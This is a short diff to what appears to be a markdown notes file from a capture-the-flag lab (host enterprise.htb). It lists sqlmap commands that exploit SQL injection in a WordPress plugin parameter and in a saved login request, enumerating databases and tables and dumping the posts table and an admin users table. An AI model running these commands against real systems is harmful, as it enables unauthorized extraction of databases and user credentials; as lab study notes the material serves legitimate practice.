@@ -14,3 +14,21 @@ sqlmap -u <http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1> 
 #Dumb a determinated row
 sqlmap -u <http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1> --batch --dump --threads 10 -dbms mysql -D wordpress  -T wp_posts -C post_content --where "ID>=66 and ID<=68"
 ```
+
+
+
+```
+sqlmap -r login.request --force-ssl --batch
+```
+
+```
+sqlmap -r login.request --force-ssl --batch --dbs
+```
+
+```
+sqlmap -r login.request --force-ssl --batch -D admin --tables
+```
+
+```
+sqlmap -r login.request --force-ssl --batch -D admin -T users --dump
+```
